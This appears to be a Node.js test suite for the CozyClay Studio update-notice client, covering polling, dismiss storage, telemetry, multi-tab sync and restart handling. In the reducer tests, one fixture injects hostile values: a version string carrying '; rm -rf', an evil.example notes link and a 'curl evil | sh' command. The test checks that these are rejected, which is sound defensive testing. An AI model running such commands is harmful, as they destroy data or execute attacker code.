#!/usr/bin/env node
// The in-Studio update notice (U1): the client reducer, dismiss storage, poll
// schedule, the hosted-page no-op, silent fetch failures, the once-per-install
// update:finished rule and the agent-busy signal. U2: multi-tab sync over an
// injected channel or storage events, and the version Help › About names.
// U2b (#960): Restart now polls until the new version answers, tolerates the
// old launcher's silence, reloads only a saved project and tells other tabs.
// No browser, no launcher.
import assert from "node:assert/strict";
import {
	CHANNEL_NAME, DISMISS_KEY, HINT_KEY, POLL_MS, RESTART_POLL_MS, RESTART_URL, RESTART_WAIT_MS, UPDATE_URL, UPDATING_POLL_MS, VISIBLE_STALE_MS, behindOf,
	createUpdatePoller, fetchUpdateInfo, nextUpdateState, normalizeUpdateInfo, readDismissed, reloadAfterRestart, requestRestart, startUpdate, updateBlocked, writeDismissed,
} from "../src/update/update-client.js";
import { noteNoticeShown, noteUpdateClicked, noteUpdatePolled, noteUpdateRestarted, updateTelemetrySeam } from "../src/update/update-telemetry.js";
import * as friction from "../src/analytics-friction.js";
import { agentTurnRunning, subscribeAgentTurns, trackAgentTurns } from "../src/workflow/agent-turn-telemetry.js";
import { createAgentTransport, createMockTransport } from "../src/workflow/agent-client.js";
import { appVersion } from "../src/app-version.js";
import { readFileSync } from "node:fs";

const body = (over = {}) => ({
	enabled: true, current: "3.1.4", latest: "3.1.5", status: "outdated", kind: "global", canSelfUpdate: true, phase: "idle",
	errorClass: null, durationMs: null, notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v3.1.5", command: "npm install -g cozyclay@latest", ...over,
});
const info = (over) => normalizeUpdateInfo(body(over));
const memoryStorage = (initial = {}) => {
	const map = new Map(Object.entries(initial));
	return { map, getItem: (key) => map.get(key) ?? null, setItem: (key, value) => map.set(key, String(value)) };
};
const throwingStorage = { getItem() { throw new Error("SecurityError"); }, setItem() { throw new Error("QuotaExceeded"); } };
const runtimeWindow = () => {
	const listeners = new Map();
	return { __COZYCLAY_RUNTIME__: { distribution: "npm" }, listeners, addEventListener: (name, fn) => listeners.set(name, fn), removeEventListener: (name) => listeners.delete(name) };
};
const settle = async () => { for (let i = 0; i < 5; i += 1) await Promise.resolve(); };

// 1. The reducer table.
{
	const rows = [
		["outdated global one-click", info(), {}, "available", ["update_now", "later"]],
		["outdated global, cannot self-update", info({ canSelfUpdate: false }), {}, "available", ["copy_command", "later"]],
		["outdated npx", info({ kind: "npx", canSelfUpdate: false }), {}, "available", ["copy_command", "later"]],
		["npx never one-click even if the flag lies", info({ kind: "npx", canSelfUpdate: true }), {}, "available", ["copy_command", "later"]],
		["clone", info({ kind: "clone" }), {}, "hidden", []],
		["up to date", info({ status: "latest" }), {}, "hidden", []],
		["unknown", info({ status: "unknown", latest: null }), {}, "hidden", []],
		["checks disabled", info({ enabled: false }), {}, "hidden", []],
		["dismissed this version", info(), { dismissed: "3.1.5" }, "hidden", []],
		["dismissed an older version", info(), { dismissed: "3.1.4" }, "available", ["update_now", "later"]],
		["updating, even when dismissed", info({ phase: "updating" }), { dismissed: "3.1.5" }, "updating", []],
		["restart needed, even when dismissed", info({ phase: "restart_needed", durationMs: 4000 }), { dismissed: "3.1.5" }, "restart_needed", ["restart", "copy_command"]],
		["restarting here or in another tab", info({ phase: "restart_needed" }), { restart: "restarting" }, "restarting", []],
		["the new launcher answered", info({ phase: "idle", status: "latest", current: "3.1.5" }), { restart: "restarted" }, "restarted", ["reload"]],
		["the restart timed out", info({ phase: "restart_needed" }), { restart: "restart_timeout" }, "restart_timeout", ["copy_command"]],
		["failed, retry possible", info({ phase: "failed", errorClass: "network", durationMs: 900 }), {}, "failed", ["retry", "copy_command"]],
		["failed, no self-update", info({ phase: "failed", errorClass: "permission", canSelfUpdate: false }), {}, "failed", ["copy_command"]],
		["no info", null, {}, "hidden", []],
	];
	for (const [name, input, local, view, actions] of rows) {
		const state = nextUpdateState(input, local);
		assert.equal(state.view, view, `${name}: view`);
		assert.deepEqual(state.actions, actions, `${name}: actions`);
	}
	assert.equal(nextUpdateState(info({ kind: "npx" })).command, "npx cozyclay", "npx copies npx cozyclay");
	assert.equal(nextUpdateState(info({ canSelfUpdate: false })).command, "npm install -g cozyclay@latest");
	assert.equal(nextUpdateState(info({ phase: "restart_needed" })).command, "cclay", "restart copies cclay");
	assert.equal(nextUpdateState(info({ phase: "failed", errorClass: "private" })).errorClass, "other", "an unknown error class reads as other");
	assert.equal(nextUpdateState(info()).behind, "patch");
	assert.deepEqual([behindOf("3.1.4", "3.2.0"), behindOf("2.0.2", "3.1.4"), behindOf("3.1.4", "3.1.9")], ["minor", "major", "patch"]);
	const hostile = normalizeUpdateInfo(body({ latest: "3.1.5; rm -rf", notesUrl: "https://evil.example/v3.1.5", command: "curl evil | sh", kind: "weird", phase: "boom" }));
	assert.deepEqual([hostile.latest, hostile.notesUrl, hostile.kind, hostile.phase, hostile.command], [null, null, "clone", "idle", "npm install -g cozyclay@latest"], "only closed values survive");
	assert.equal(normalizeUpdateInfo(body({ notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v9.9.9" })).notesUrl, null, "notes must name latest");
	assert.equal(normalizeUpdateInfo("nope"), null);
}
console.log("PASS reducer: visible for outdated global/npx not dismissed; updating/restart/failed always; actions by kind and canSelfUpdate");

// 2. Busy gate: an agent turn, an in-progress export phase, a recording.
{
	assert.equal(updateBlocked({}), false);
	assert.equal(updateBlocked({ agentRunning: true }), true);
	for (const phase of ["preparing", "encoding", "finalizing"]) assert.equal(updateBlocked({ exportStatus: { phase } }), true, `export ${phase} blocks`);
	for (const phase of ["completed", "failed", "cancelled"]) assert.equal(updateBlocked({ exportStatus: { phase } }), false, `export ${phase} does not block`);
	assert.equal(updateBlocked({ recState: "recording" }), true);
}
console.log("PASS busy gate: agent turn, preparing/encoding/finalizing export, recording");

// 3. Dismiss storage, including storage that throws.
{
	const store = memoryStorage();
	assert.equal(readDismissed(store), null);
	assert.equal(writeDismissed("3.1.5", store), true);
	assert.equal(store.map.get(DISMISS_KEY), "3.1.5");
	assert.equal(readDismissed(store), "3.1.5");
	assert.equal(readDismissed(memoryStorage({ [DISMISS_KEY]: "garbage" })), null, "a non-version value is ignored");
	assert.equal(readDismissed(throwingStorage), null, "a throwing read is nothing dismissed");
	assert.equal(writeDismissed("3.1.5", throwingStorage), false, "a throwing write reports false, never throws");
	assert.equal(readDismissed(undefined), null);
}
console.log("PASS dismiss storage: per version, try/catch on read and write");

// 4. The hosted-page no-op: no runtime, no request.
{
	let calls = 0;
	const fetchImpl = async () => { calls += 1; return { ok: true, json: async () => body() }; };
	assert.equal(await fetchUpdateInfo(fetchImpl, {}), null);
	assert.equal(await startUpdate(fetchImpl, undefined), null);
	let scheduled = 0;
	const poller = createUpdatePoller({ fetchImpl, win: {}, timers: { afterFirstFrame: () => { scheduled += 1; } } });
	await poller.update();
	poller.dismiss("3.1.5");
	poller.stop();
	assert.equal(calls, 0, "no request without window.__COZYCLAY_RUNTIME__");
	assert.equal(scheduled, 0, "no poll scheduled");
}
console.log("PASS no runtime: the client and the poller make no request");

// 5. Fetch errors fail silently.
{
	const win = runtimeWindow();
	for (const fetchImpl of [
		async () => { throw new TypeError("Failed to fetch"); },
		async () => ({ ok: false, status: 403, json: async () => ({ error: "forbidden origin" }) }),
		async () => ({ ok: true, json: async () => { throw new SyntaxError("bad json"); } }),
		null,
	]) {
		assert.equal(await fetchUpdateInfo(fetchImpl, win), null);
		assert.equal(await startUpdate(fetchImpl, win), null);
	}
	const seen = [];
	const ok = await fetchUpdateInfo(async (url, init) => { seen.push([url, init.method, init.body]); return { ok: true, json: async () => body() }; }, win);
	await startUpdate(async (url, init) => { seen.push([url, init.method, init.body]); return { ok: true, json: async () => body({ phase: "updating" }) }; }, win);
	assert.equal(ok.latest, "3.1.5");
	assert.deepEqual(seen, [[UPDATE_URL, "GET", undefined], [UPDATE_URL, "POST", undefined]], "GET and a body-less POST to the route");
}
console.log("PASS fetch errors (throw, 403, bad JSON, no fetch) resolve null without throwing");

// 6. The poll schedule, with fake timers.
{
	let clock = 0, nextId = 1;
	const pending = new Map();
	let firstFrame = null;
	const timers = {
		set: (fn, ms) => { pending.set(nextId, { fn, at: clock + ms, ms }); return nextId++; },
		clear: (id) => pending.delete(id),
		now: () => clock,
		afterFirstFrame: (fn) => { firstFrame = fn; },
	};
	const advance = async (ms) => {
		clock += ms;
		for (const [id, timer] of [...pending]) if (timer.at <= clock) { pending.delete(id); timer.fn(); }
		await settle();
	};
	const win = runtimeWindow();
	const docListeners = new Map();
	const doc = { visibilityState: "visible", addEventListener: (name, fn) => docListeners.set(name, fn), removeEventListener: (name) => docListeners.delete(name) };
	const store = memoryStorage();
	let response = body(), requests = 0, posts = 0;
	const fetchImpl = async (_url, init) => {
		requests += 1;
		if (init.method === "POST") { posts += 1; response = body({ phase: "updating" }); }
		return { ok: true, json: async () => response };
	};
	const states = [];
	const poller = createUpdatePoller({ fetchImpl, timers, win, doc, storage: store, onState: ({ state }) => states.push(state.view) });
	assert.equal(requests, 0, "nothing before the first frame and idle");
	firstFrame();
	await settle();
	assert.equal(requests, 1, "one check after the first frame");
	assert.deepEqual(states, ["available"]);
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "next poll in 6 h");
	await advance(VISIBLE_STALE_MS - 1000);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 1, "a tab shown within the hour does not re-check");
	await advance(2000);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 2, "a tab shown after more than an hour re-checks");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "the re-check replaced the 6 h timer, never doubled it");
	doc.visibilityState = "hidden";
	await advance(VISIBLE_STALE_MS * 2);
	docListeners.get("visibilitychange")();
	await settle();
	assert.equal(requests, 2, "a hidden tab does not check");
	doc.visibilityState = "visible";
	await advance(POLL_MS);
	assert.equal(requests, 3, "the 6 h poll fires");
	await poller.update();
	await settle();
	assert.equal(posts, 1);
	assert.equal(states.at(-1), "updating");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [UPDATING_POLL_MS], "2 s polling while updating");
	await advance(UPDATING_POLL_MS);
	await advance(UPDATING_POLL_MS);
	const during = requests;
	response = body({ phase: "restart_needed", durationMs: 41_000 });
	await advance(UPDATING_POLL_MS);
	assert.equal(requests, during + 1);
	assert.equal(states.at(-1), "restart_needed");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS], "back to 6 h once the install ends");
	// Dismiss and a second tab's storage event.
	response = body();
	await advance(POLL_MS);
	assert.equal(states.at(-1), "available");
	poller.dismiss("3.1.5");
	assert.equal(store.map.get(DISMISS_KEY), "3.1.5");
	assert.equal(states.at(-1), "hidden", "dismiss hides this version now");
	store.map.delete(DISMISS_KEY);
	win.listeners.get("storage")({ key: DISMISS_KEY });
	assert.equal(states.at(-1), "available", "another tab clearing the key shows it again");
	store.map.set(DISMISS_KEY, "3.1.5");
	win.listeners.get("storage")({ key: "cozyclay.locale" });
	assert.equal(states.at(-1), "available", "an unrelated key changes nothing");
	win.listeners.get("storage")({ key: DISMISS_KEY });
	assert.equal(states.at(-1), "hidden", "another tab dismissing hides it here too");
	// A failing launcher keeps the last state and the schedule.
	const before = states.length;
	response = null;
	await advance(POLL_MS);
	assert.equal(states.length, before, "a failed poll changes nothing");
	assert.deepEqual([...pending.values()].map(({ ms }) => ms), [POLL_MS]);
	poller.stop();
	assert.equal(pending.size, 0, "stop clears the timer");
	assert.equal(docListeners.size + (win.listeners.has("storage") ? 1 : 0), 0, "stop removes the listeners");
	// Storage that throws: the notice still works and the dismiss still hides it for this page.
	const views = [];
	let frame = null;
	const throwing = createUpdatePoller({ fetchImpl: async () => ({ ok: true, json: async () => body() }), timers: { ...timers, afterFirstFrame: (fn) => { frame = fn; } }, win: runtimeWindow(), doc, storage: throwingStorage, onState: ({ state }) => views.push(state.view) });
	frame();
	await settle();
	assert.doesNotThrow(() => throwing.dismiss("3.1.5"));
	assert.deepEqual(views, ["available", "hidden"]);
	throwing.stop();
}
console.log("PASS poll schedule: first frame + idle, 6 h, visible after 1 h, 2 s while updating, storage events across tabs, stop");

// 7. Telemetry: closed values, caps, once per install.
{
	friction.reset();
	const sent = [];
	const store = memoryStorage();
	const restore = updateTelemetrySeam((event, props) => sent.push({ event, props }), store);
	noteNoticeShown(nextUpdateState(info({ current: "3.0.9" })));
	noteNoticeShown(nextUpdateState(info()));
	noteNoticeShown(nextUpdateState(info({ kind: "clone" })));
	assert.deepEqual(sent, [{ event: "update:notice_shown", props: { kind: "global", behind: "minor" } }], "notice_shown once per session");
	sent.length = 0;
	for (let i = 0; i < 12; i += 1) noteUpdateClicked("update_now", "global");
	noteUpdateClicked("hack", "global");
	assert.equal(sent.length, 10, "update:clicked is capped at 10");
	sent.length = 0;
	const done = info({ phase: "restart_needed", durationMs: 41_000 });
	for (let i = 0; i < 4; i += 1) noteUpdatePolled(done);
	noteUpdatePolled(info({ phase: "updating" }));
	noteUpdatePolled(info({ phase: "restart_needed" }));
	assert.deepEqual(sent, [{ event: "update:finished", props: { outcome: "ok", error_class: "none", duration: "30-60s" } }], "once per install, however many polls see it; never without a duration");
	// Another tab (fresh memory, same storage) does not send it again.
	restore();
	const restoreTab = updateTelemetrySeam((event, props) => sent.push({ event, props }), store);
	noteUpdatePolled(done);
	assert.equal(sent.length, 1, "a second tab sharing localStorage does not re-send the same install");
	noteUpdatePolled(info({ phase: "failed", errorClass: "permission", durationMs: 3000 }));
	noteUpdatePolled(info({ phase: "failed", errorClass: "network", durationMs: 7000 }));
	noteUpdatePolled(info({ phase: "failed", errorClass: "other", durationMs: 9000 }));
	assert.deepEqual(sent.slice(1).map(({ props }) => props), [
		{ outcome: "failed", error_class: "permission", duration: "lt10s" },
		{ outcome: "failed", error_class: "network", duration: "lt10s" },
	], "each retry is its own install; the cap of 3 holds");
	restoreTab();
	// Storage that throws still keeps it to once on this page.
	const restoreThrowing = updateTelemetrySeam((event, props) => sent.push({ event, props }), throwingStorage);
	friction.reset();
	sent.length = 0;
	noteUpdatePolled(done);
	noteUpdatePolled(done);
	assert.equal(sent.length, 1, "throwing storage: once per install on this page");
	restoreThrowing();
	friction.reset();
}
console.log("PASS telemetry: notice_shown once, clicked cap 10, finished once per install across polls and tabs, cap 3");

// 8. The agent-busy signal flips on and off around a mock transport turn, including an abort.
{
	const changes = [];
	const unsubscribe = subscribeAgentTurns((running) => changes.push(running));
	const transport = createAgentTransport({ mockConfig: { state: "ready", speed: 50 }, surface: "studio" });
	assert.equal(agentTurnRunning(), false);
	const running = transport.turn({ text: "walk" }, () => {}, new AbortController().signal);
	assert.equal(agentTurnRunning(), true, "on while the turn runs");
	await running;
	assert.equal(agentTurnRunning(), false, "off when the turn ends");
	const controller = new AbortController();
	const aborted = transport.turn({ text: "wave" }, () => {}, controller.signal);
	assert.equal(agentTurnRunning(), true);
	controller.abort();
	await aborted;
	assert.equal(agentTurnRunning(), false, "off after an abort");
	const throwing = trackAgentTurns({ async turn() { throw new Error("upstream"); } });
	await assert.rejects(throwing.turn(), /upstream/);
	assert.equal(agentTurnRunning(), false, "off after a throw");
	const direct = trackAgentTurns(createMockTransport({ state: "error", speed: 50 }));
	await direct.turn({ text: "x" }, () => {});
	assert.equal(agentTurnRunning(), false, "off after a scripted error turn");
	const self = { tag: "me", async turn() { return this.tag; } };
	assert.equal(await trackAgentTurns(self).turn(), "me", "turn keeps its this");
	unsubscribe();
	assert.deepEqual(changes, [true, false, true, false, true, false, true, false, true, false]);
}
console.log("PASS agent-busy signal: on during a mock turn, off on done, abort, throw and error");

// 9. Multi-tab sync: two pollers on one profile, over a fake BroadcastChannel and over storage alone.
{
	// Microtasks alone can end before a hinted fetch lands; a macrotask turn drains it.
	const drain = () => new Promise((resolve) => setImmediate(resolve));
	// One launcher both tabs fetch from; `phase` is its truth.
	const launcher = { phase: "idle", gets: 0, posts: 0 };
	const fetchImpl = async (_url, init) => {
		if (init.method === "POST") { launcher.posts += 1; launcher.phase = "updating"; } else launcher.gets += 1;
		return { ok: true, json: async () => body({ phase: launcher.phase, durationMs: launcher.phase === "restart_needed" ? 41_000 : null }) };
	};
	// The fake channel delivers to every other end asynchronously, as a BroadcastChannel does.
	const channels = new Set();
	const openChannel = () => {
		const end = {
			listeners: new Set(), closed: false, sent: [],
			postMessage(data) { end.sent.push(data); for (const other of channels) if (other !== end) queueMicrotask(() => { for (const fn of other.listeners) fn({ data }); }); },
			addEventListener: (name, fn) => { if (name === "message") end.listeners.add(fn); },
			removeEventListener: (name, fn) => end.listeners.delete(fn),
			close() { end.closed = true; channels.delete(end); },
		};
		channels.add(end);
		return end;
	};
	// localStorage shared by the profile: a write fires `storage` on every other tab's window.
	const windows = new Set();
	const sharedStorage = () => {
		const store = memoryStorage();
		const setItem = store.setItem;
		store.setItem = (key, value) => { setItem(key, value); for (const win of windows) if (win !== store.writer) win.listeners.get("storage")?.({ key, newValue: String(value) }); };
		return store;
	};
	const tab = (store, channel) => {
		const win = runtimeWindow();
		windows.add(win);
		const views = [];
		let scheduled = null;
		const timers = { set: (fn) => { scheduled = fn; return 1; }, clear() {}, now: () => 0, afterFirstFrame: (fn) => fn() };
		// Writes from this tab do not fire its own storage listener.
		const own = { getItem: (key) => store.getItem(key), setItem: (key, value) => { store.writer = win; store.setItem(key, value); store.writer = null; } };
		const poller = createUpdatePoller({ fetchImpl, timers, win, doc: null, storage: own, channel, onState: ({ state }) => views.push(state.view) });
		return { poller, views, win, poll: () => scheduled() };
	};

	// BroadcastChannel path.
	let store = sharedStorage();
	const endA = openChannel(), endB = openChannel();
	const a = tab(store, endA), b = tab(store, endB);
	await drain();
	assert.deepEqual([a.views.at(-1), b.views.at(-1), launcher.gets], ["available", "available", 2]);
	a.poller.dismiss("3.1.5");
	await drain();
	assert.equal(b.views.at(-1), "hidden", "a dismiss in one tab hides the chip in the other");
	assert.deepEqual(endA.sent.at(-1), { type: "dismiss", latest: "3.1.5" });
	await a.poller.update();
	await drain();
	assert.equal(launcher.posts, 1);
	assert.equal(launcher.gets, 3, "an install start makes the other tab poll now, not in 2 s");
	assert.equal(b.views.at(-1), "updating", "the other tab shows the launcher's phase");
	launcher.phase = "restart_needed";
	let gets = launcher.gets;
	a.poll();
	await drain();
	assert.deepEqual(endA.sent.at(-1), { type: "phase", latest: null }, "a tab whose own poll sees a new phase says so");
	assert.equal(launcher.gets, gets + 2, "the other tab polls at once; it does not echo the hint back");
	assert.equal(b.views.at(-1), "restart_needed");
	assert.equal(endB.sent.length, 0, "a tab only told about a change never re-broadcasts it");
	a.poller.stop();
	const c = tab(store, openChannel());
	await drain();
	gets = launcher.gets;
	endB.listeners.forEach((fn) => fn({ data: { type: "phase", phase: "failed" } }));
	await drain();
	assert.equal(launcher.gets, gets + 1, "a phase hint makes the tab poll now");
	assert.equal(b.views.at(-1), "restart_needed", "the hint's own phase is never trusted; the launcher's is");
	assert.equal(c.views.at(-1), "restart_needed");
	endB.listeners.forEach((fn) => fn({ data: { type: "bogus" } }));
	endB.listeners.forEach((fn) => fn({ data: null }));
	await drain();
	assert.equal(launcher.gets, gets + 1, "unknown or empty messages do nothing");
	assert.equal(endA.closed, true, "stop closes the channel");
	b.poller.stop();
	c.poller.stop();
	assert.equal(channels.size, 0);

	// A dismiss still reaches a tab whose storage throws: the message carries the version.
	launcher.phase = "idle";
	const d = tab(sharedStorage(), openChannel());
	const e = (() => {
		const win = runtimeWindow();
		const views = [];
		const poller = createUpdatePoller({ fetchImpl, timers: { set: () => 0, clear() {}, now: () => 0, afterFirstFrame: (fn) => fn() }, win, doc: null, storage: throwingStorage, channel: openChannel(), onState: ({ state }) => views.push(state.view) });
		return { poller, views };
	})();
	await drain();
	d.poller.dismiss("3.1.5");
	await drain();
	assert.equal(e.views.at(-1), "hidden", "a tab without storage takes the dismissed version from the message");
	d.poller.stop();
	e.poller.stop();

	// No BroadcastChannel: the storage event carries the dismiss and the install hint.
	windows.clear();
	store = sharedStorage();
	const f = tab(store, null), g = tab(store, null);
	await drain();
	assert.deepEqual([f.views.at(-1), g.views.at(-1)], ["available", "available"]);
	f.poller.dismiss("3.1.5");
	assert.equal(g.views.at(-1), "hidden", "storage fallback: a dismiss reaches the other tab");
	assert.equal(store.map.has(HINT_KEY), false, "a dismiss needs no hint key: the dismiss key is the event");
	const before = launcher.gets;
	await f.poller.update();
	await drain();
	assert.match(store.map.get(HINT_KEY), /^install:/);
	assert.equal(launcher.gets, before + 1, "storage fallback: an install start makes the other tab poll now");
	assert.equal(g.views.at(-1), "updating");
	f.poller.stop();
	g.poller.stop();
	assert.equal(CHANNEL_NAME, "cozyclay:update");
}
console.log("PASS multi-tab: dismiss, install start and phase hints reach other tabs at once; hints trigger a poll, never a state; storage fallback");

// 11. Restart now: POST, poll until `current` is the installed version through failed fetches,
//     the 30 s ceiling, the dirty gate, the cross-tab message, and update:restarted.
{
	let clock = 0, nextId = 1;
	const pending = new Map();
	const timers = {
		set: (fn, ms) => { pending.set(nextId, { fn, at: clock + ms }); return nextId++; },
		clear: (id) => pending.delete(id),
		now: () => clock,
		afterFirstFrame: (fn) => fn(),
	};
	const advance = async (ms) => {
		clock += ms;
		for (const [id, timer] of [...pending]) if (timer.at <= clock) { pending.delete(id); timer.fn(); }
		for (let i = 0; i < 4; i += 1) await new Promise((resolve) => setImmediate(resolve));
	};
	// The launcher: restart_needed on 3.1.4, then silent (fetch throws), then the new one on 3.1.5.
	const launcher = { mode: "old", gets: 0, restarts: [] };
	const fetchImpl = async (url, init) => {
		if (url === RESTART_URL) {
			launcher.restarts.push([init.method, init.body]);
			if (launcher.refuse) return { ok: false, status: 409, json: async () => ({ error: "restart unavailable" }) };
			launcher.mode = "down";
			return { ok: true, status: 202, json: async () => body({ phase: "restart_needed", durationMs: 4000 }) };
		}
		launcher.gets += 1;
		if (launcher.mode === "down") throw new TypeError("Failed to fetch");
		if (launcher.mode === "new") return { ok: true, json: async () => body({ current: "3.1.5", status: "latest", phase: "idle" }) };
		return { ok: true, json: async () => body({ phase: "restart_needed", durationMs: 4000 }) };
	};
	const channels = new Set();
	const openChannel = () => {
		const end = {
			listeners: new Set(), sent: [],
			postMessage(data) { end.sent.push(data); for (const other of channels) if (other !== end) queueMicrotask(() => { for (const fn of other.listeners) fn({ data }); }); },
			addEventListener: (name, fn) => { if (name === "message") end.listeners.add(fn); },
			removeEventListener: (name, fn) => end.listeners.delete(fn),
			close() { channels.delete(end); },
		};
		channels.add(end);
		return end;
	};
	const tab = (channel) => {
		const views = [];
		const poller = createUpdatePoller({ fetchImpl, timers, win: runtimeWindow(), doc: null, storage: memoryStorage(), channel, onState: ({ state }) => views.push(state) });
		return { poller, views, view: () => views.at(-1)?.view };
	};
	const endA = openChannel(), endB = openChannel();
	const a = tab(endA), b = tab(endB);
	await advance(0);
	assert.deepEqual([a.view(), b.view()], ["restart_needed", "restart_needed"]);
	assert.deepEqual(a.views.at(-1).actions, ["restart", "copy_command"], "restart_needed offers Restart now");
	const outcome = a.poller.restart();
	await advance(0);
	assert.deepEqual(launcher.restarts, [["POST", undefined]], "one body-less POST to the restart route");
	assert.deepEqual(endA.sent.at(-1), { type: "restart", latest: "3.1.5" }, "the other tabs are told which version to wait for");
	assert.deepEqual([a.view(), b.view()], ["restarting", "restarting"], "both tabs show Restarting… at once");
	const getsBefore = launcher.gets;
	for (let t = 0; t < 5; t += 1) await advance(RESTART_POLL_MS);
	assert.ok(launcher.gets - getsBefore >= 8, "both tabs poll every second while the launcher is down");
	assert.deepEqual([a.view(), b.view()], ["restarting", "restarting"], "failed fetches are tolerated, not shown");
	launcher.mode = "old";
	await advance(RESTART_POLL_MS);
	assert.equal(a.view(), "restarting", "an answer that still names the old version keeps waiting");
	launcher.mode = "new";
	await advance(RESTART_POLL_MS);
	assert.deepEqual([a.view(), b.view()], ["restarted", "restarted"], "both tabs see the new launcher's 3.1.5");
	assert.equal(await outcome, "ok");
	assert.deepEqual(a.views.at(-1).actions, ["reload"]);
	assert.equal(endB.sent.length, 0, "a tab told about the restart does not echo it");
	assert.equal(await a.poller.restart(), "ok", "a second press returns the same outcome, no second POST");
	assert.equal(launcher.restarts.length, 1);
	a.poller.stop(); b.poller.stop();

	// 30 s of silence: restart_timeout with the cclay command.
	launcher.mode = "old";
	const c = tab(null);
	await advance(0);
	const timedOut = c.poller.restart();
	await advance(0);
	for (let t = 0; t < RESTART_WAIT_MS / RESTART_POLL_MS + 1; t += 1) await advance(RESTART_POLL_MS);
	assert.equal(await timedOut, "timeout");
	assert.equal(c.view(), "restart_timeout");
	assert.deepEqual([c.views.at(-1).actions, c.views.at(-1).command], [["copy_command"], "cclay"]);
	c.poller.stop();

	// A 409: nothing changes, nothing is hinted.
	launcher.mode = "old"; launcher.refuse = true;
	const endD = openChannel();
	const d = tab(endD);
	await advance(0);
	assert.equal(await d.poller.restart(), null);
	assert.equal(d.view(), "restart_needed");
	assert.equal(endD.sent.length, 0);
	assert.equal(await requestRestart(fetchImpl, {}), null, "no runtime: no request");
	d.poller.stop();

	// The dirty gate.
	let reloads = 0;
	assert.equal(reloadAfterRestart({ dirty: false, reload: () => { reloads += 1; } }), true);
	assert.equal(reloadAfterRestart({ dirty: true, reload: () => { reloads += 1; } }), false, "a dirty project is never reloaded");
	assert.equal(reloads, 1);

	// update:restarted: closed outcomes, once per session; restart joins the click actions.
	friction.reset();
	const sent = [];
	const restore = updateTelemetrySeam((event, props) => sent.push({ event, props }), memoryStorage());
	noteUpdateClicked("restart", "global");
	noteUpdateRestarted("bogus");
	noteUpdateRestarted("ok");
	noteUpdateRestarted("timeout");
	assert.deepEqual(sent, [{ event: "update:clicked", props: { action: "restart", kind: "global" } }, { event: "update:restarted", props: { outcome: "ok" } }]);
	restore();
	friction.reset();
}
console.log("PASS restart: one POST, every tab waits through failed fetches for the new version, 30 s timeout, 409 no-op, dirty gate, update:restarted once");

// The restart target is the installed version, not the registry's latest (a newer release may appear while the
// launcher waits), and the storage fallback's hint carries it to the other tab.
{
	let clock = 0, nextId = 1;
	const pending = new Map();
	const timers = { set: (fn, ms) => { pending.set(nextId, { fn, at: clock + ms }); return nextId++; }, clear: (id) => pending.delete(id), now: () => clock, afterFirstFrame: (fn) => fn() };
	const advance = async (ms) => {
		clock += ms;
		for (const [id, timer] of [...pending]) if (timer.at <= clock) { pending.delete(id); timer.fn(); }
		for (let i = 0; i < 4; i += 1) await new Promise((resolve) => setImmediate(resolve));
	};
	const waiting = { phase: "restart_needed", installed: "3.1.5", latest: "3.2.0", notesUrl: "https://github.com/HaD0Yun/CozyClay/releases/tag/v3.2.0", durationMs: 4000 };
	const launcher = { mode: "old" };
	const fetchImpl = async (url) => {
		if (url === RESTART_URL) { launcher.mode = "down"; return { ok: true, status: 202, json: async () => body(waiting) }; }
		if (launcher.mode === "down") throw new TypeError("Failed to fetch");
		if (launcher.mode === "new") return { ok: true, json: async () => body({ current: "3.1.5", latest: "3.2.0", notesUrl: waiting.notesUrl, status: "outdated", phase: "idle" }) };
		return { ok: true, json: async () => body(waiting) };
	};
	const map = new Map(), wins = [];
	const tab = () => {
		const win = runtimeWindow(), views = [];
		wins.push(win);
		const storage = { getItem: (key) => map.get(key) ?? null, setItem(key, value) { map.set(key, String(value)); for (const other of wins) if (other !== win) other.listeners.get("storage")?.({ key, newValue: String(value) }); } };
		const poller = createUpdatePoller({ fetchImpl, timers, win, doc: null, storage, channel: null, onState: ({ state }) => views.push(state) });
		return { poller, view: () => views.at(-1) };
	};
	const a = tab(), b = tab();
	await advance(0);
	assert.deepEqual([a.view().view, a.view().latest], ["restart_needed", "3.1.5"], "Updated to names the installed 3.1.5, not the registry's newer 3.2.0");
	const outcome = a.poller.restart();
	await advance(0);
	assert.match(map.get(HINT_KEY), /^restart:\d+:\d+:3\.1\.5$/, "the storage fallback's restart hint carries the target version");
	assert.deepEqual([a.view().view, b.view().view, b.view().latest], ["restarting", "restarting", "3.1.5"], "the other tab waits for the installed version");
	launcher.mode = "new";
	await advance(RESTART_POLL_MS);
	await advance(RESTART_POLL_MS);
	assert.deepEqual([a.view().view, b.view().view], ["restarted", "restarted"], "a launcher on 3.1.5 ends the wait, though the registry now says 3.2.0");
	assert.equal(await outcome, "ok");
	a.poller.stop();
	b.poller.stop();
}
console.log("PASS restart target: the installed version, not the registry's latest; the storage fallback hint carries it");

// 10. Help › About names the runtime appVersion, not the never-defined VITE_APP_VERSION.
{
	const packageVersion = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8")).version;
	assert.equal(appVersion({ __COZYCLAY_RUNTIME__: { appVersion: "3.9.1" } }), "3.9.1", "the launcher's runtime wins");
	assert.equal(appVersion({}), packageVersion, "a hosted page falls back to package.json");
	assert.equal(appVersion(undefined), packageVersion);
	assert.equal(appVersion({ __COZYCLAY_RUNTIME__: { appVersion: "" } }), packageVersion);
	assert.equal(appVersion({ get __COZYCLAY_RUNTIME__() { throw new Error("blocked"); } }), packageVersion);
	const menuBar = readFileSync(new URL("../src/shell/MenuBar.jsx", import.meta.url), "utf8");
	assert.doesNotMatch(menuBar, /VITE_APP_VERSION/, "About no longer reads VITE_APP_VERSION");
	assert.match(menuBar, /\{ko\("Version", "버전"\)\} \{appVersion\(\)\}/, "About always names a version");
}
console.log("PASS About: window.__COZYCLAY_RUNTIME__.appVersion, else package.json; no VITE_APP_VERSION");
